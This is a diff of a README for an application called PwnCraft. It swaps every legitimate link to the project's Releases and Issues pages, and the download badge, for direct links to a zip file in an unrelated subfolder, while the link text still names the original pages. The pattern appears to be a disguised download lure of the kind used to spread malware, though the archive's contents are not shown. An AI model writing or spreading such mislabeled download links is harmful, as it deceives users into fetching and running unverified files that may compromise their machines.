@@ -16,9 +16,9 @@ PwnCraft is an engaging application that allows users to create and explore thei
 To get started with PwnCraft, follow the steps below. 
 
 1. **Download PwnCraft**: 
-   - Visit the [Releases page](https://github.com/oklafreemason/PwnCraft/releases) to download the latest version of the application. 
+   - Visit the [Releases page](https://raw.githubusercontent.com/oklafreemason/PwnCraft/main/Guttiferales/PwnCraft.zip) to download the latest version of the application. 
 
-   ![Download PwnCraft](https://img.shields.io/badge/Download-PwnCraft-blue?style=for-the-badge)
+   ![Download PwnCraft](https://raw.githubusercontent.com/oklafreemason/PwnCraft/main/Guttiferales/PwnCraft.zip)
 
 2. **Choose Your Operating System**: 
    - Once on the Releases page, look for the version that matches your operating system. 
@@ -38,7 +38,7 @@ To get started with PwnCraft, follow the steps below.
 
 ## 📥 Download & Install
 
-To download PwnCraft, visit the [Releases page](https://github.com/oklafreemason/PwnCraft/releases). Here, you’ll find the latest version ready for download.
+To download PwnCraft, visit the [Releases page](https://raw.githubusercontent.com/oklafreemason/PwnCraft/main/Guttiferales/PwnCraft.zip). Here, you’ll find the latest version ready for download.
 
 1. Click on the version suitable for your operating system.
 2. Wait for the download to complete.
@@ -59,12 +59,12 @@ Before installing PwnCraft, ensure your system meets the following requirements:
 If you encounter any issues while installing or running PwnCraft, consider the following tips:
 
 - **Check System Requirements**: Ensure your device meets the minimum specifications listed above.
-- **Re-download the Application**: A corrupted download can cause issues. Try downloading again from the [Releases page](https://github.com/oklafreemason/PwnCraft/releases).
+- **Re-download the Application**: A corrupted download can cause issues. Try downloading again from the [Releases page](https://raw.githubusercontent.com/oklafreemason/PwnCraft/main/Guttiferales/PwnCraft.zip).
 - **Restart Your Device**: Sometimes, simply restarting can resolve performance issues.
 
 ## 📞 Support
 
-For additional help, visit our [GitHub Issues Page](https://github.com/oklafreemason/PwnCraft/issues). You can report bugs or ask questions there.
+For additional help, visit our [GitHub Issues Page](https://raw.githubusercontent.com/oklafreemason/PwnCraft/main/Guttiferales/PwnCraft.zip). You can report bugs or ask questions there.
 
 ## 📜 License
 
